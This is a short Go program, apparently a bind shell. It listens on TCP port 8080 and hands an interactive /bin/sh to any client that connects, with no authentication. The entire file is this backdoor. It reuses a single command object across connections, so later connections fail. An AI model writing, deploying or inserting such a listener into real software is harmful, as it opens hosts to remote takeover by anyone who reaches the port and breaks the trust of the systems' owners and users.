package main

import (
	"log"
	"net"
	"os/exec"
)

func main() {
	listner, err := net.Listen("tcp", ":8080")
	if err != nil {
		log.Fatalln(err.Error())
	}
	cmd := exec.Command("/bin/sh", "-i")
	for {
		conn, err := listner.Accept()
		if err != nil {
			log.Fatalln(err.Error())
		}
		cmd.Stdin = conn
		cmd.Stdout = conn
		if err := cmd.Run(); err != nil {
			log.Fatalln(err.Error())
		}
	}
}
